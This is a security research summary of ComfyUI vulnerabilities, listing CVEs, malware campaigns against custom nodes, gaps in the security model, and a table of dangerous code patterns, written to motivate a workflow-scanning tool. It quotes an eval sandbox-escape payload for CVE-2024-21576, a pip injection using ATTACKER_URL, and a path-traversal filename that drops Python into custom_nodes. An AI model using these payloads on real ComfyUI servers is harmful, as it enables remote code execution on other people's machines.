# ComfyUI Security Vulnerability Research: Comprehensive Findings

**Date:** 2026-03-27
**Researchers:** Sean Michael (M2 Dynamics) + Claude (Anthropic)
**Status:** Initial research complete, analysis ongoing

---

## 1. Known CVEs and Security Incidents

### Complete CVE Catalog

**CVE-2024-21574 -- ComfyUI-Manager Pip Dependency Injection**
- **CVSS:** Critical
- ComfyUI-Manager's `/customnode/install` endpoint failed to validate the `pip` field during dependency installation. An attacker could inject malicious package URLs via `"pip": ["ATTACKER_URL"]`, achieving arbitrary code execution through pip's `setup.py`.
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21574)

**CVE-2024-21575 -- ComfyUI-Impact-Pack Path Traversal**
- **CVSS:** Critical
- The `/upload/temp` endpoint accepted user-controlled filenames without sanitization. Uploading files with names like `../custom_nodes/pwn.py` allowed writing arbitrary Python files to the auto-loading `custom_nodes/` directory, achieving RCE on server restart.
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21575)

**CVE-2024-21576 -- ComfyUI-Bmad-Nodes Eval Injection**
- **CVSS 4.0:** 10.0 CRITICAL
- Nodes `BuildColorRangeHSVAdvanced`, `FilterContour`, and `FindContour` use `eval()` with insufficient sanitization. The `prepare_text_for_eval()` function is trivially bypassed.
- Example payload: `[h_v('os').system('whoami') for h_k, h_v in m.__spec__.__init__.__builtins__.items() if '__imp' in h_k]`
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21576) | [Snyk Research](https://labs.snyk.io/resources/hacking-comfyui-through-custom-nodes/)

**CVE-2024-21577 -- ComfyUI-Ace-Nodes Direct Eval Exposure**
- **CVSS 4.0:** 10.0 CRITICAL
- The `ACE_ExpressionEval` node uses `eval()` with zero input sanitization on user-controlled data. Any workflow using this node can execute arbitrary Python.
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21577)

**CVE-2024-10481 -- ComfyUI Core CSRF**
- No CSRF protections on API endpoints `/upload/image`, `/prompt`, and `/history`. An attacker can host a malicious website that performs arbitrary API requests on behalf of users who visit it.
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-10481)

**CVE-2025-67303 -- ComfyUI-Manager Configuration Exposure / RCE**
- ComfyUI-Manager stored config files in web-accessible locations. Remote attacker with no authentication could access and modify configuration, leading to full server compromise.
- Discovered by Tencent Xuanwu Lab, January 2026.
- [GitHub Advisory GHSA-2hc9-cc65-xwj8](https://github.com/advisories/GHSA-2hc9-cc65-xwj8)

**CVE-2025-6107 -- ComfyUI Core Dynamic Object Attribute Manipulation**
- The `set_attr` function in `/comfy/utils.py` allows dynamically-determined object attribute manipulation. Remotely exploitable.
- Vendor did not respond to disclosure.
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-6107)

**CVE-2026-22777 -- ComfyUI-Manager CRLF Injection**
- **CVSS 3.1:** 7.5 HIGH
- Attacker can inject CRLF sequences into HTTP query parameters to write arbitrary values to `config.ini`, including modifying security settings.
- [GitHub Advisory GHSA-562r-8445-54r2](https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2)

### Major Real-World Incidents

**June 2024: ComfyUI_LLMVISION / Nullbulge Attack**
- Hacker group "Nullbulge" compromised the LLMVISION extension (GPT-4/Claude integration)
- Malicious code hidden inside fake OpenAI and Anthropic Python wheel packages via `requirements.txt`
- Stole: browser passwords, credit card details, browsing history, crypto wallets, screenshots, device info, IP addresses
- Data exfiltrated to attacker-controlled Discord server
- Nullbulge posted hundreds of stolen ComfyUI users' login credentials publicly
- Sources: [VPNMentor](https://www.vpnmentor.com/news/comfyui-malicious-custom-node/) | [HackRead](https://hackread.com/comfyui-malicious-node-steal-crypto-browser-data/) | [SentinelOne](https://www.sentinelone.com/labs/nullbulge-threat-actor-masquerades-as-hacktivist-group-rebelling-against-ai/)

**December 2024: Ultralytics Supply Chain Attack via Impact-Pack**
- Ultralytics packages 8.3.41 and 8.3.42 compromised via GitHub Actions exploitation
- Bundled cryptominer connecting to `connect.consrensys.com:8080`
- ComfyUI-Impact-Pack (one of the most popular custom nodes) depends on Ultralytics, exposing massive user base
- Malicious packages available for 12+ hours before removal
- Sources: [ComfyUI Wiki](https://comfyui-wiki.com/en/news/2024-12-05-comfyui-impact-pack-virus-alert) | [Wiz Blog](https://www.wiz.io/blog/ultralytics-ai-library-hacked-via-github-for-cryptomining)

**January 2026: Upscaler_4K / Akira Stealer Distribution**
- Malicious nodes (`upscaler-4k`, `lonemilk-upscalernew-4k`, `ComfyUI-Upscaler-4K`) distributed Akira Stealer
- Golang-based infostealer targeting browser data, crypto wallets, Discord tokens
- Bypassed registry scanners by hiding malicious logic in `/scripts/` folder
- Persistence: copied to AppData as `DisplayUpdater.exe`, marked as hidden system file
- Approximately 779 total installations across three variants
- Sources: [GitHub Issue #11791](https://github.com/Comfy-Org/ComfyUI/issues/11791)

**March-May 2025: Pickai Backdoor Campaign**
- C++ backdoor "Pickai" distributed via ComfyUI vulnerabilities
- Compromised at least 695 servers worldwide
- Chinese National Cybersecurity Notification Center issued high-risk warning
- Capabilities: remote command execution, reverse shell, AI data theft
- ELF executables disguised as config files: `config.json`, `tmux.conf`, `vim.json`
- Sources: [SecurityOnline](https://securityonline.info/comfyui-under-attack-pickai-c-backdoor-compromises-700-ai-image-generation-servers-globally/) | [XLab Blog](https://blog.xlab.qianxin.com/pickai-the_backdoor_hiding_in_your_ai_stack/)

---

## 2. ComfyUI's Security Model

### No Built-in Sandboxing

ComfyUI does NOT sandbox custom node execution. All custom nodes run in the main Python process with full filesystem and network access. There is no permission system, capability restrictions, or execution isolation. Any Python file placed in `./custom_nodes/` is executed on server startup.

### Hidden Inputs Expose Full Workflow Context

Custom nodes can declare hidden inputs to access:
- **PROMPT**: The complete workflow JSON (all other nodes' configurations visible)
- **DYNPROMPT**: A mutable version that changes during node expansion
- **UNIQUE_ID**: The node's unique identifier
- **EXTRA_PNGINFO**: Dictionary copied into PNG metadata

Any node in a workflow can inspect the entire workflow configuration and all other nodes' parameters.

### Subgraph Expansion

Nodes returning `{"expand": new_graph}` can dynamically create new nodes and connections at runtime. This meta-programming capability could be abused to inject nodes that weren't in the original workflow.

### Shared Cache (No Isolation)

All nodes share output and object caches. A malicious node could poison the cache to affect subsequent runs or other nodes' behavior.

### ComfyUI-Manager Security Response (Post-2025)

After the incidents, ComfyUI-Manager added:
- Trust badge system (green/yellow/red)
- Security levels for installation restrictions
- AI + static analysis scanning (proprietary)
- Registry immutability for published versions
- Remote disable capability for discovered malicious nodes
- Plans to ban `eval()`/`exec()` (incrementally)
- Plans to ban runtime `pip install` via subprocess (6-month timeline)
- Source: [ComfyUI January 2025 Security Update](https://blog.comfy.org/p/comfyui-2025-jan-security-update)

### What Remains Unaddressed

- No sandboxing of filesystem access
- No network access restrictions for nodes
- No capability-based permission model
- No code signing for node packages
- No integrity verification after installation
- No runtime behavior monitoring

---

## 3. Ecosystem Scale

- **2,000+** custom nodes in the community repository
- **500+** pre-vetted node packs in the official registry
- **100,000** installs of ComfyUI Manager
- **2.5 million** shared workflows
- **1.2 million** total ComfyUI downloads
- **45,000** GitHub stars
- Source: [WifiTalents ComfyUI Statistics](https://wifitalents.com/comfyui-statistics/)

---

## 4. Dangerous Patterns Found in Custom Nodes

### Known Dangerous Function Usage

| Pattern | Usage | Risk |
|---------|-------|------|
| `eval()` / `exec()` | Expression evaluators, math nodes, script runners | Direct RCE |
| `subprocess` | Pip installations, external tool invocation | Command injection |
| `os.system()` | Nodes calling ffmpeg, imagemagick, etc. | Command injection |
| `importlib` | Dynamic module loading | Arbitrary module execution |
| `compile()` | Bypasses static analysis of eval/exec | Evasion |
| `requests` / `urllib` | Model downloaders, API integrations | SSRF, data exfiltration |

### High-Risk Node Categories

1. **Expression evaluator nodes** (ACE_ExpressionEval, MathExpression, PythonExpression)
2. **Script runner nodes** (RunPython, Execute, AnyNode)
3. **Model download nodes** (any node accepting URLs for checkpoints/LoRAs)
4. **File I/O nodes** (nodes reading/writing arbitrary paths)
5. **API integration nodes** (nodes connecting to external services)
6. **LLM code generation nodes** (AnyNode lets LLMs generate executable code)

---

## 5. Existing Security Tools

| Tool | Focus | Workflow Graph Analysis? |
|------|-------|------------------------|
| custom-nodes-security-scan (christian-byrne) | Static analysis of node source code | No |
| ComfyUI Registry scanner | AI + static analysis of node packages | No |
| ModelScan (Protect AI) | Model file scanning (H5, Pickle, SavedModel) | No |
| Fickling (Trail of Bits) | Pickle file analysis | No |
| TensorTrap | Model file security scanning | **Planned** |

**No existing tool performs workflow graph security analysis.** This is the gap TensorTrap is positioned to fill.

---

## 6. Key Architecture Details for TensorTrap Integration

### How ComfyUI Executes Workflows

1. Workflow JSON submitted to `/prompt` endpoint
2. `PromptQueue` serializes execution requests
3. `TopologicalSort` determines execution order based on node dependencies
4. Nodes transition: Unscheduled -> Pending -> Blocked -> Ready -> Staged -> Executing -> Completed
5. `get_input_data()` resolves constant values and linked outputs
6. Nodes return tuples, dicts, or V3 `NodeOutput` objects
7. Results cached for subsequent runs

### Cross-Node Data Access

A node CAN access other nodes' data through:
1. PROMPT hidden input (complete workflow JSON)
2. DYNPROMPT hidden input (mutable graph state)
3. Subgraph expansion (dynamic node creation)
4. Shared Python process (runtime inspection of global state)

---

## 7. Summary

**The threat is real and actively exploited.** ComfyUI has 8+ documented CVEs, multiple real-world malware campaigns (Nullbulge, Ultralytics, Upscaler_4K, Pickai), and 700+ confirmed server compromises. The attack surface is enormous: 2,000+ custom nodes, 2.5M shared workflows, zero runtime sandboxing, and a community culture of "install what the workflow needs."

**ComfyUI is responding, but slowly.** Registry standards, scanning, and eval/exec restrictions are being rolled out incrementally. Fundamental architectural issues remain unaddressed.

**No existing tool analyzes workflow graphs for security.** This is TensorTrap's opportunity.
